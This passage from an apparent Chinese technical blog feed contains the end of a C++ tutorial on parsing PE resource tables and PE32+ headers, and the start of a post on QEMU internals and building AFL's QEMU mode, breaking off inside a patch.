0x%X\n"</span>, value &amp; <span class="hljs-number">0x0fff</span>);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"         Reloc RVA: 0x%X\n\n"</span>, basereloc_table[i].VirtualAddress + (value &amp; <span class="hljs-number">0x0fff</span>));<br>}<br><br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END=========\n\n"</span>);<br><br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="Step-3-4-解析资源表（-rsrc）"><a href="#Step-3-4-解析资源表（-rsrc）" class="headerlink" title="Step 3.4: 解析资源表（.rsrc）"></a>Step 3.4: 解析资源表（.rsrc）</h3><ul><li><p>资源表是干啥的？</p><ul><li>资源表存储着与GUI显示有关的元数据，也就是所谓的资源，包括光标、图标、菜单、位图等</li></ul></li><li><p>资源表的结构：</p><ul><li>三层树结构</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/1.gif"></p></li></ul><table><thead><tr><th align="left">数据</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">资源目录表（和资源目录条目）</td><td align="left">一系列表，树中每组节点对应一个表。 第一个表中列出了所有第一级（类型）节点。 此表中的条目指向第二级表。 每二级树具有相同的类型 ID，但名称 ID 不同。 第三级树具有相同的类型和名称 ID，但语言 ID 不同。 每个单独的表后紧跟目录条目，其中每个条目都有一个名称或数字标识符，以及一个指向数据描述或下一级表的指针。</td></tr><tr><td align="left">资源目录字符串</td><td align="left">双字节对齐的 Unicode 字符串，用作目录条目指向的字符串数据。</td></tr><tr><td align="left">资源数据描述</td><td align="left">由表指向的记录数组，用于描述资源数据的实际大小和位置。 这些记录是资源描述树中的叶。</td></tr><tr><td align="left">资源数据</td><td align="left">资源节的原始数据。 资源数据描述字段中的大小和位置信息分隔资源数据的各个区域。</td></tr></tbody></table><hr><p><strong>1. 资源目录表</strong></p><table><thead><tr><th align="left">Offset</th><th align="left">大小</th><th align="left">字段</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">4</td><td align="left">特征</td><td align="left">资源标志。 保留此字段供将来使用。 它当前设置为零。</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">时间/日期戳</td><td align="left">资源编译器创建资源数据的时间。</td></tr><tr><td align="left">8</td><td align="left">2</td><td align="left">主要版本</td><td align="left">主要版本号，由用户设置。</td></tr><tr><td align="left">10</td><td align="left">2</td><td align="left">次要版本</td><td align="left">次要版本号，由用户设置。</td></tr><tr><td align="left">12</td><td align="left">2</td><td align="left">名称条目数</td><td align="left">紧跟在表之后的目录条目数，这些条目使用字符串来标识类型、名称或语言条目（取决于表的级别）。</td></tr><tr><td align="left">14</td><td align="left">2</td><td align="left">ID 条目数</td><td align="left">紧跟在名称条目之后的目录条目数，这些条目对类型、名称或语言条目使用数字 ID。</td></tr></tbody></table><p><strong>2. 资源目录条目</strong></p><table><thead><tr><th align="left">Offset</th><th align="left">大小</th><th align="left">字段</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">4</td><td align="left">名称偏移量</td><td align="left">提供类型、名称或语言 ID 条目的字符串的偏移量，具体取决于表的级别。</td></tr><tr><td align="left">0</td><td align="left">4</td><td align="left">整数标识符</td><td align="left">标识类型、名称或语言 ID 条目的 32 位整数。</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">数据条目偏移量</td><td align="left">高位 0。 资源数据条目（叶）的地址。</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">子目录偏移量</td><td align="left">高位 1。 较低的 31 位是另一个资源目录表的地址（下一级）。</td></tr></tbody></table><p><strong>3. 资源目录字符串</strong></p><ul><li>存储在最后一个资源目录条目之后和第一个资源数据条目之前</li></ul><table><thead><tr><th align="left">Offset</th><th align="left">大小</th><th align="left">字段</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">2</td><td align="left">长度</td><td align="left">字符串的大小，不包括长度字段本身。</td></tr><tr><td align="left">2</td><td align="left">可变</td><td align="left">Unicode 字符串</td><td align="left">可变长度的 Unicode 字符串数据，字对齐。</td></tr></tbody></table><p><strong>4. 资源数据条目</strong></p><table><thead><tr><th align="left">Offset</th><th align="left">大小</th><th align="left">字段</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">4</td><td align="left">数据 RVA</td><td align="left">资源数据区域中资源数据单位的地址。</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">大小</td><td align="left">数据 RVA 字段指向的资源数据的大小（以字节为单位）。</td></tr><tr><td align="left">8</td><td align="left">4</td><td align="left">codepage</td><td align="left">用于解码资源数据中的码位值的代码页。 通常，代码页将是 Unicode 代码页。</td></tr><tr><td align="left">12</td><td align="left">4</td><td align="left">保留，必须为 0。</td><td align="left"></td></tr></tbody></table><hr><ul><li>解析流程：<ul><li>按序依次解析即可</li></ul></li><li>处理代码：</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::parse_resources_table</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-type">size_t</span> read_size;<br><br><span class="hljs-keyword">if</span> (!resource_dir_table_rva || !resource_dir_table_size) <span class="hljs-keyword">return</span>;<br><br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(resource_dir_table_rva), SEEK_SET);<br>read_size = <span class="hljs-built_in">fread</span>(&amp;resource_dir_root, <span class="hljs-built_in">sizeof</span>(___IMAGE_RESOURCE_DIRECTORY), <span class="hljs-number">1</span>, pe_fp);<br><br><span class="hljs-keyword">if</span> (read_size != <span class="hljs-number">1</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-comment">// 之后的操作就交给print()函数去处理</span><br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::print_resources_table_info</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><br><span class="hljs-keyword">if</span> (!resource_dir_table_rva || !resource_dir_table_size) {<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"=====No resource table=====\n\n"</span>);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END=========\n\n"</span>);<br><span class="hljs-keyword">return</span>;<br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"=======Resource table======\n\n"</span>);<br><br><span class="hljs-type">size_t</span> read_size;<br>DWORD total_entries_num = resource_dir_root.NumberOfNamedEntries +<br>resource_dir_root.NumberOfIdEntries;<br>DWORD i, j;<br><br>___IMAGE_RESOURCE_DIRECTORY_ENTRY tmp_entries_0;<br><br>DWORD start_pos = <span class="hljs-built_in">va_to_raw</span>(resource_dir_table_rva);<br><br><span class="hljs-comment">// 先读取第一层的entries</span><br><span class="hljs-comment">// 这里用递归解析是不是更优雅点？（TODO?）</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; total_entries_num; i++) {<br><br><span class="hljs-built_in">fseek</span>(pe_fp, start_pos + <span class="hljs-built_in">sizeof</span>(__IMAGE_RESOURCE_DIRECTORY) + i * <span class="hljs-built_in">sizeof</span>(___IMAGE_RESOURCE_DIRECTORY_ENTRY), SEEK_SET);<br><br>read_size = <span class="hljs-built_in">fread</span>(&amp;tmp_entries_0, <span class="hljs-built_in">sizeof</span>(___IMAGE_RESOURCE_DIRECTORY_ENTRY), <span class="hljs-number">1</span>, pe_fp);<br><br><span class="hljs-keyword">if</span> (read_size != <span class="hljs-number">1</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-keyword">if</span> (tmp_entries_0.DUMMYUNIONNAME.DUMMYSTRUCTNAME.NameIsString) {<br><span class="hljs-comment">// 资源ID是字符串</span><br><span class="hljs-built_in">fseek</span>(pe_fp, start_pos + tmp_entries_0.DUMMYUNIONNAME.DUMMYSTRUCTNAME.NameOffset, SEEK_SET);<br>WORD unicode_len;<br><span class="hljs-built_in">fread</span>(&amp;unicode_len, <span class="hljs-built_in">sizeof</span>(WORD), <span class="hljs-number">1</span>, pe_fp);<br><span class="hljs-type">wchar_t</span>* name_tmp = (<span class="hljs-type">wchar_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">wchar_t</span>) * (unicode_len + <span class="hljs-number">1</span>));<br><span class="hljs-keyword">if</span> (!name_tmp) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Name_tmp malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>name_tmp[unicode_len] = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">fread</span>(name_tmp, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">wchar_t</span>), unicode_len, pe_fp);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" * Name Entry: %ws\n"</span>, name_tmp);<br><span class="hljs-built_in">free</span>(name_tmp);<br>}<br><span class="hljs-keyword">else</span> {<br><span class="hljs-comment">// 资源ID是数字</span><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" * ID Entry: %03d\n"</span>, tmp_entries_0.DUMMYUNIONNAME.Id);<br>}<br><br><span class="hljs-comment">// fprintf(stdout, "    - \n");</span><br><br><span class="hljs-comment">// 解析第二层</span><br><span class="hljs-keyword">if</span> (tmp_entries_0.DUMMYUNIONNAME2.DUMMYSTRUCTNAME2.DataIsDirectory) {<br><span class="hljs-comment">// 获取第二级目录表</span><br>DWORD offset = tmp_entries_0.DUMMYUNIONNAME2.DUMMYSTRUCTNAME2.OffsetToDirectory;<br><span class="hljs-built_in">fseek</span>(pe_fp, offset + start_pos, SEEK_SET);<br>___IMAGE_RESOURCE_DIRECTORY tmp_dir;<br><span class="hljs-built_in">fread</span>(&amp;tmp_dir, <span class="hljs-built_in">sizeof</span>(___IMAGE_RESOURCE_DIRECTORY), <span class="hljs-number">1</span>, pe_fp);<br>DWORD total_entries_num_2 = tmp_dir.NumberOfIdEntries + tmp_dir.NumberOfNamedEntries;<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Entries Count: %d\n"</span>, total_entries_num_2);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Subentries:\n"</span>);<br><br><span class="hljs-comment">// 依然解析资源名是数字还是字符串</span><br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; total_entries_num_2; j++) {<br><br>__IMAGE_RESOURCE_DIRECTORY_ENTRY tmp_entries_1;<br><span class="hljs-built_in">fseek</span>(pe_fp, offset + start_pos + <span class="hljs-built_in">sizeof</span>(___IMAGE_RESOURCE_DIRECTORY) + j * <span class="hljs-built_in">sizeof</span>(__IMAGE_RESOURCE_DIRECTORY_ENTRY), SEEK_SET);<br><span class="hljs-built_in">fread</span>(&amp;tmp_entries_1, <span class="hljs-built_in">sizeof</span>(__IMAGE_RESOURCE_DIRECTORY_ENTRY), <span class="hljs-number">1</span>, pe_fp);<br><br><span class="hljs-keyword">if</span> (tmp_entries_1.DUMMYUNIONNAME.DUMMYSTRUCTNAME.NameIsString) {<br><br><span class="hljs-comment">// 资源名是字符串，解析字符串</span><br><span class="hljs-built_in">fseek</span>(pe_fp, start_pos + tmp_entries_1.DUMMYUNIONNAME.DUMMYSTRUCTNAME.NameOffset, SEEK_SET);<br>WORD unicode_len;<br><span class="hljs-built_in">fread</span>(&amp;unicode_len, <span class="hljs-built_in">sizeof</span>(WORD), <span class="hljs-number">1</span>, pe_fp);<br><span class="hljs-type">wchar_t</span>* name_tmp = (<span class="hljs-type">wchar_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">wchar_t</span>) * (unicode_len + <span class="hljs-number">1</span>));<br><span class="hljs-keyword">if</span> (!name_tmp) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Name_tmp malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>name_tmp[unicode_len] = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">fread</span>(name_tmp, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">wchar_t</span>), unicode_len, pe_fp);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"       - Name Entry: %ws\n"</span>, name_tmp);<br><br>}<br><span class="hljs-keyword">else</span> {<br><br><span class="hljs-comment">// 资源名是数字</span><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"       - ID Entry: %03d\n"</span>, tmp_entries_1.DUMMYUNIONNAME.Id);<br><br>}<br><br><span class="hljs-comment">// 最后一层资源</span><br><br><span class="hljs-keyword">if</span> (tmp_entries_1.DUMMYUNIONNAME2.DUMMYSTRUCTNAME2.DataIsDirectory) {<br><br>___IMAGE_RESOURCE_DIRECTORY_ENTRY tmp_entries_2;<br>___IMAGE_RESOURCE_DATA_ENTRY data_entry;<br><br><span class="hljs-built_in">fseek</span>(pe_fp, start_pos + tmp_entries_1.DUMMYUNIONNAME2.DUMMYSTRUCTNAME2.OffsetToDirectory + <span class="hljs-built_in">sizeof</span>(___IMAGE_RESOURCE_DIRECTORY), SEEK_SET);<br><span class="hljs-built_in">fread</span>(&amp;tmp_entries_2, <span class="hljs-built_in">sizeof</span>(tmp_entries_2), <span class="hljs-number">1</span>, pe_fp);<br><br><span class="hljs-built_in">fseek</span>(pe_fp, start_pos + tmp_entries_2.DUMMYUNIONNAME2.DUMMYSTRUCTNAME2.OffsetToDirectory, SEEK_SET);<br><span class="hljs-built_in">fread</span>(&amp;data_entry, <span class="hljs-built_in">sizeof</span>(data_entry), <span class="hljs-number">1</span>, pe_fp);<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"          - Resource's RVA: 0x%0X\n"</span>, data_entry.OffsetToData);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"          - Resource's Size: 0x%0X\n"</span>, data_entry.Size);<br><br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n"</span>);<br>}<br>}<br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END=========\n\n"</span>);<br><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>运行结果：</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/14.png"></p><p>至此，我们已经基本上完成了PE32文件的解析工作。</p><h2 id="Step-4-解析PE32"><a href="#Step-4-解析PE32" class="headerlink" title="Step 4: 解析PE32+"></a>Step 4: 解析PE32+</h2><ul><li><p>PE32+，i.e. 64位的PE文件</p></li><li><p>PE32与PE32+的区别：</p><p><span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 第一个很显然的，<code>NT Header - Optional Header</code>的<code>Magic</code>字段不同，对于<code>PE32</code>来说是<code>10B（NT32）</code>，对于<code>PE32+</code>来说是<code>20B（NT64）</code>；</p><p><span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>PE32+</code>的<code>NT Header - Optional Header</code>与<code>PE32</code>不同，主要体现在：</p><ul><li><code>PE32</code>有一个字段为<code>BaseofData</code>，而<code>PE32+</code>没有（该4个字节给了<code>ImageBase</code>，因为<code>ImageBase</code>由4字节扩展到了8字节）；</li><li><code>PE32+</code>中，<code>ImageBase</code>、<code>SizeOfStackReserve</code>、<code>SizeOfStackCommit</code>、<code>SizeOfHeapReserve</code>、<code>SizeOfHeapCommit</code>由4字节扩展到8字节，因此<code>PE32+</code>的<code>NT Header64</code>要比<code>PE32</code>的<code>NT Header32</code>多出 4*4 = 16字节（如前所述，<code>BaseofData</code>的字节已经分给了<code>ImageBase</code>）</li><li>在<code>PE32+</code>中，导入表的导入查找表ITL为64位的数组，而在<code>PE32</code>中，其为32位数组，这里需要区分</li></ul></li><li><p>因此，<code>PE32+</code>解析与<code>PE32</code>解析不同之处：</p><ul><li><code>NT Header</code>不同：主要指的是<code>Optional Header</code>，解析时需要单独处理</li><li>导入查找表寻址：<code>PE32+</code>以64位进行寻址，而<code>PE32</code>以32位进行寻址</li></ul><p>根据上述不同，我们可以很容易发动CV技能（<span class="github-emoji"><span>😆</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>）实现对<code>PE32+</code>文件的解析</p></li></ul><h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><ol><li><a href="https://0xrick.github.io/win-internals/pe2/">A dive into the PE file format - PE file structure - Part 1: Overview - 0xRick’s Blog</a></li><li><a href="https://0xrick.github.io/win-internals/pe3/">A dive into the PE file format - PE file structure - Part 2: DOS Header, DOS Stub and Rich Header - 0xRick’s Blog</a></li><li><a href="https://0xrick.github.io/win-internals/pe4/">A dive into the PE file format - PE file structure - Part 3: NT Headers - 0xRick’s Blog</a></li><li><a href="https://0xrick.github.io/win-internals/pe5/">A dive into the PE file format - PE file structure - Part 4: Data Directories, Section Headers and Sections - 0xRick’s Blog</a></li><li><a href="https://0xrick.github.io/win-internals/pe6/">A dive into the PE file format - PE file structure - Part 5: PE Imports (Import Directory Table, ILT, IAT) - 0xRick’s Blog</a></li><li><a href="https://0xrick.github.io/win-internals/pe7/">A dive into the PE file format - PE file structure - Part 6: PE Base Relocations - 0xRick’s Blog</a></li><li>[<a href="https://bbs.kanxue.com/thread-252795.htm#msg_header_h2_8">原创]打造自己的PE解析器-编程技术-看雪-安全社区|安全招聘|kanxue.com</a></li><li>[PE-learning/PE learning at master · jmhIcoding/PE-learning (github.com)](<a href="https://github.com/jmhIcoding/PE-learning/tree/master/PE">https://github.com/jmhIcoding/PE-learning/tree/master/PE</a> learning)</li><li><a href="https://0xrick.github.io/win-internals/pe8/#a-dive-into-the-pe-file-format---lab-1-writing-a-pe-parser">A dive into the PE file format - LAB 1: Writing a PE Parser - 0xRick’s Blog</a></li><li><a href="https://www.virusbulletin.com/virusbulletin/2020/01/vb2019-paper-rich-headers-leveraging-mysterious-artifact-pe-format/">Virus Bulletin :: VB2019 paper: Rich Headers: leveraging this mysterious artifact of the PE format</a></li><li><a href="https://www.cnblogs.com/zpchcbd/p/14674298.html">VirtualAddress与VirtualSize与SizeOfRawData与PointerToRawData的关系 - zpchcbd - 博客园 (cnblogs.com)</a></li><li><a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#special-sections">PE Format - Win32 apps | Microsoft Learn</a></li><li><a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#the-idata-section">PE Format - Win32 apps | Microsoft Learn</a></li><li><a href="https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format#the-edata-section-image-only">PE 格式 - Win32 apps | Microsoft Learn</a></li><li><a href="http://research32.blogspot.com/2015/01/base-relocation-table.html">research32: Base relocation table</a></li><li><a href="https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format#the-reloc-section-image-only">PE 格式 - Win32 apps | Microsoft Learn</a></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>PE</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于QEMU和AFL-QEMU模式那些事</title>
    <link href="/2023/07/20/%E5%85%B3%E4%BA%8EQEMU%E5%92%8CAFL-QEMU%E6%A8%A1%E5%BC%8F%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <url>/2023/07/20/%E5%85%B3%E4%BA%8EQEMU%E5%92%8CAFL-QEMU%E6%A8%A1%E5%BC%8F%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="关于QEMU和AFL-QEMU模式那些事"><a href="#关于QEMU和AFL-QEMU模式那些事" class="headerlink" title="关于QEMU和AFL-QEMU模式那些事"></a>关于QEMU和AFL-QEMU模式那些事</h1><h2 id="1-QEMU是什么？"><a href="#1-QEMU是什么？" class="headerlink" title="1. QEMU是什么？"></a>1. QEMU是什么？</h2><ul><li>QEMU（Quick EMUlator）是一个仿真和模拟虚拟环境的开源<strong>软件</strong>，其本质上还是一个软件，通过<strong>动态翻译</strong>实现模拟[1]。</li><li>软件虚拟化</li><li>跨平台</li><li>仿真多种架构的处理器</li></ul><h3 id="动态翻译"><a href="#动态翻译" class="headerlink" title="动态翻译"></a>动态翻译</h3><ul><li>以模拟x86下的指令为例，动态翻译的基本思想就是把每一条x86指令切分为若干条微操作，而每条微操作都是由<strong>QEMU中的一段简单的C代码</strong>来实现</li><li>QEMU的动态翻译后端是TCG[2]，Tiny Code Generator</li></ul><h3 id="CPU-状态优化"><a href="#CPU-状态优化" class="headerlink" title="CPU 状态优化"></a>CPU 状态优化</h3><ul><li>状态记录在翻译块（Translation Block，TB）中</li><li>如果状态发生改变，那么新TB将会生成，而之前的TB将不再使用直到状态与之前的TB相匹配</li><li>e.g. x86 SS-堆栈段寄存器 DS-数据段寄存器 ES-附加段寄存器 为0时，将不再生成一个新的段基址</li></ul><h3 id="块直接链接"><a href="#块直接链接" class="headerlink" title="块直接链接"></a>块直接链接</h3><ul><li><p>执行完每一个翻译块之后，QEMU根据模拟的PC和CPU状态信息来找到下一个基本块（基于哈希表？）</p><ul><li>如果下一个块还没被翻译过，那么将载入一个新的块</li><li>否则，跳转到下一个已经翻译过的块中</li></ul></li><li><p>对于模拟的PC已知的情况下，QEMU直接patch一个TB：直接跳转</p></li></ul><h3 id="自修改代码和翻译代码非法检查"><a href="#自修改代码和翻译代码非法检查" class="headerlink" title="自修改代码和翻译代码非法检查"></a>自修改代码和翻译代码非法检查</h3><ul><li>当一个TB生成后，相应的页是写保护的。如果对该页进行写操作，那么QEMU将使得所有已翻译的块失效，并重新启用写权限</li><li>给定一个页维护一个由每一个TB块构成的链表</li></ul><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><ul><li><code>longjmp()</code>：FPE</li><li>SIGSEGV、SIGBUS</li></ul><h3 id="MMU-模拟"><a href="#MMU-模拟" class="headerlink" title="MMU 模拟"></a>MMU 模拟</h3><h2 id="2-AFL-QEMU模式"><a href="#2-AFL-QEMU模式" class="headerlink" title="2. AFL QEMU模式"></a>2. AFL QEMU模式</h2><h3 id="2-1-安装"><a href="#2-1-安装" class="headerlink" title="2.1 安装"></a>2.1 安装</h3><ul><li>安装相关依赖：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-comment"># 缺少啥依赖补充啥即可，这里仅展示名字差异较大的安装包</span><br>$ sudo ap-get install libtool-bin libglib2.0-dev<br></code></pre></td></tr></tbody></table></figure><ul><li>将<code>build_qemu_support.sh</code>脚本的下载地址修改为<a href="https://download.qemu.org/qemu-2.10.0.tar.xz%EF%BC%8C%E5%8E%9F%E5%9C%B0%E5%9D%80404%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE">https://download.qemu.org/qemu-2.10.0.tar.xz，原地址404无法访问</a></li><li>运行脚本！</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ bash build_qemu_support.sh<br></code></pre></td></tr></tbody></table></figure><p><strong>错误1</strong>：如果出现下面的报错信息，则将<code>build_qemu_support.sh</code>脚本的第148-150行的<code>./configure</code>末尾添加一个<code>--python=/path/to/python_bin</code>即可：</p><figure class="highlight subunit"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">...<br><span class="hljs-keyword">ERROR: </span>Cannot use 'python', Python 2.6 or later is required.<br>       Note that Python 3 or later is not yet supported.<br>       Use --python=/path/to/python to specify a supported Python.<br></code></pre></td></tr></tbody></table></figure><p>e.g.</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">CFLAGS="-O3 -ggdb" ./configure --disable-system \<br>  --enable-linux-user --disable-gtk --disable-sdl --disable-vnc \<br>  --target-list="${CPU_TARGET}-linux-user" --enable-pie --enable-kvm --python=/usr/bin/python2.7 || exit 1<br></code></pre></td></tr></tbody></table></figure><p><strong>错误2</strong>：如果出现下面的报错信息，原因是glibc wrapper更改所致，解决办法是将下述补丁添加到patches/syscall.path中：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">error: static declaration of ‘gettid’ follows non-static declaration<br>error: ‘SIOCGSTAMP’ undeclared here (not <span class="hljs-keyword">in</span> a <span class="hljs-keyword">function</span>); did you mean ‘SIOCSRARP’?<br>error: ‘SIOCGSTAMPNS’ undeclared here (not <span class="hljs-keyword">in</span> a <span class="hljs-keyword">function</span>); did you mean ‘SIOCGSTAMP_OLD’?<br></code></pre></td></tr></tbody></table></figure><p><strong>Patch</strong>（syscall1.patch）:</p><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 